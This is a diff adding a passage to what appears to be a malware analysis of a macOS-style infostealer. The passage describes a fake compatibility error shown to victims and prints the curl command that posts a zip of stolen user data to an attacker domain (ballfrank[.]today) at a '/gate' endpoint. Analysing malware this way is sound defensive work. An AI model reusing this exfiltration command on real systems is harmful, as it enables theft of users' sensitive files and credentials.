@@ -754,3 +754,19 @@ The collected information is then compressed into a zip archive located at '/tmp
 
 <img width="783" height="277" alt="image" src="https://github.com/user-attachments/assets/5ca34cc9-b285-4755-bbe1-a0589422cbb7" />
 
+A fake compatibility error prompt is then shown to the victim:
+
+<img width="425" height="158" alt="image" src="https://github.com/user-attachments/assets/d0c4a896-5bac-4d0c-81f0-38f4bafa4b0e" />
+
+The zip archive containing all of the users sensitive information is then exfiltrated via a POST request to ballfrank[.]today, as was shown in the previous script:
+
+```
+curl -k -X POST \
+     -H "User-Agent: Mozilla/5.0 ..." \
+     -H "api-key: $api_key" \
+     -H "cl: 0" \
+     --max-time 300 \
+     -F "file=@/tmp/osalogging.zip" \
+     -F "buildtxd=$token" \
+     "http://$domain/gate"
+```
